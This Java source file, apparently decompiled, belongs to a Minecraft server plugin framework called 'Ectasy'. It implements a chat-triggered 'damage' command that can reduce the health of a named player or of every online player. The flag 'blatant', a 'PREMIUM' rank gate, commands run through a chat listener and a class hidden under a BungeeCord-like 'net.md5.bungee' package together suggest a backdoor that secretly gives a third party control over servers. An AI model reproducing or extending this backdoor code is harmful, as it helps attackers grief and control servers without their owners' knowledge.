package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "damage",
   description = "Damages a player",
   blatant = true,
   rank = Rank.PREMIUM
)
public class DamageCommand extends AbstractCommand {
   public DamageCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent event, String var2, String[] args) {
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length == 0) {
               ChatUtil.sendChat(event.getPlayer(), "Please, use damage <player | *> <hearts>");
            } else if (args.length == 1) {
               double var7;
               try {
                  var7 = Double.parseDouble(args[0]);
               } catch (NumberFormatException var5) {
                  ChatUtil.sendChat(event.getPlayer(), "Invalid amount of hearts " + args[0]);
                  return;
               }

               event.getPlayer().setHealth(event.getPlayer().getHealth() - var7 * 2.0);
               ChatUtil.sendChat(event.getPlayer(), "You have been damaged.");
            } else {
               double var1;
               try {
                  var1 = Double.parseDouble(args[1]);
               } catch (NumberFormatException var6) {
                  ChatUtil.sendChat(event.getPlayer(), "Invalid amount of hearts " + args[1]);
                  return;
               }

               if (!args[0].equals("*")) {
                  Player var8 = Bukkit.getPlayerExact(args[0]);
                  if (var8 == null) {
                     ChatUtil.sendChat(event.getPlayer(), "The player " + args[0] + " is not online.");
                  } else {
                     var8.setHealth(var8.getHealth() - var1 * 2.0);
                     ChatUtil.sendChat(event.getPlayer(), var8.getName() + " has been damaged.");
                  }
               } else {
                  for(Player var4 : Bukkit.getServer().getOnlinePlayers()) {
                     var4.getPlayer().setHealth(var4.getPlayer().getHealth() - var1 * 2.0);
                  }

                  ChatUtil.sendChat(event.getPlayer(), "All players have been damaged.");
               }
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
}
